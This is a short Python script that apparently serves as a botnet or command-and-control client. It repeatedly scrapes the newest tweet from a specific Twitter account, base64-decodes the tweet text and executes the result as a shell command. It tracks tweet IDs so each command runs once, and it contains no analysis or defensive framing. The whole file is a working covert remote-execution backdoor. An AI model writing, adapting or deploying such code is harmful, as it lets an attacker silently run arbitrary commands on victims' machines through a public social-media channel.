# coding: utf-8
# python 3.7.1 x86_64

import requests
import bs4
import subprocess

from base64 import b64decode
from random import seed, random
from sys import exit
from time import sleep
from datetime import datetime

url_twitter = "https://twitter.com/S1mpleCC"
url_pastebin = "https://pastebin.com/9b86kWeM"
css_class = "TweetTextSize TweetTextSize--normal js-tweet-text tweet-text"
css_class_id = "tweet js-stream-tweet js-actionable-tweet js-profile-popup-actionable dismissible-content original-tweet js-original-tweet"
seed()
# my_key = PastebinAPI.generate_user_key(api_dev_key, username, password)

def r_tweet():
    html = requests.get(url_twitter)
    soup = bs4.BeautifulSoup(html.text, 'html.parser')
    last_tweet = soup.find('p', {css_class}).get_text()
    id_tweet = soup.find('div', {css_class_id}).attrs["data-tweet-id"]

    return id_tweet, last_tweet

with open("save_id.txt", mode="a+", encoding="utf-8") as c:
    with open("save_id.txt", mode="r+", encoding="utf-8") as fp:
        last_id = [l.rstrip("\n") for l in fp.readlines()]

while True:
    try:
        id, tweet = r_tweet()

        if id not in last_id:
            cmd = b64decode(tweet).decode("utf-8")
            subprocess.Popen(cmd, shell=True,stdout=subprocess.PIPE,
                stderr=subprocess.PIPE)
            last_id.append(id)
            with open("save_id.txt", mode="a", encoding="utf-8") as fp:
                fp.write(f"{id}\n")
        sleep(random())
    except KeyboardInterrupt:
        exit(1)
